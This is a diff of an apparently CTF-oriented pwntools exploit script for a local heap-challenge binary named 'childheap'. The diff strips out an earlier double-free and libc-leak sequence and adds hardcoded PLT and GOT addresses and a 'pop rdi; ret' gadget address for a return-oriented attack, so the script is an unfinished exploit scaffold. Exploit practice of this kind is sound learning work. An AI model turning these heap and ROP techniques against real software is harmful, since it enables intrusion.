@@ -1,39 +1,41 @@
 from pwn import *
 
-def malloc(index, size,content):
-	p.sendlineafter('> ','1')
-	p.sendlineafter('index: ',str(index))
-	p.sendlineafter('size: ',str(size))
-	p.sendafter('content: ',str(content))		
+context.log_level = 'debug'
+
+def malloc(index, size, content):
+	p.recvuntil('>')
+	p.sendline('1')
+
+	p.sendlineafter('index:', index)
+	p.sendlineafter('size:', size)
+	p.sendlineafter('content:', content)
 
 def free(index):
-	p.sendlineafter('> ','2')
-        p.sendlineafter('index: ',str(index))
+	p.recvuntil('>')
+	p.sendline('2')
+
+	p.sendlineafter('index:', index)
 
 p = process('./childheap')
-e = ELF("./childheap")
+#p = remote('',)
+e = ELF('./childheap')
 l = e.libc
+#l = ELF('./')
 
-for name,addr in e.got.items():
-	log.info(name + ' : ' + hex(addr))
 
+free_plt = 0x4006ec
+malloc_plt = 0x400760
+puts_plt = 0x400700
+read_plt = 0x400740
+printf_plt = 0x400730
+
+malloc_got = 0x602050
+puts_got = 0x602020
+read_got = 0x602040
+free_got = 0x602018
+printf_got = 0x602038
+
+p_rdi_r = 0x0000000000400bc3
 pause()
-context.log_level = "debug"
-
-### libc leak
-malloc(0, 10, '1')
-malloc(1, 10, '1')
-free(0)
-malloc(2, 0x7f, '1')
-free(2) # malloc_consolidate()
-
-malloc(0,10,' ')
-malloc(1, 10, ' ') # fence
-malloc(2, 10, ' ') # fence2
-
-free(0)
-free(1)
-free(0)
 
 p.interactive()
-
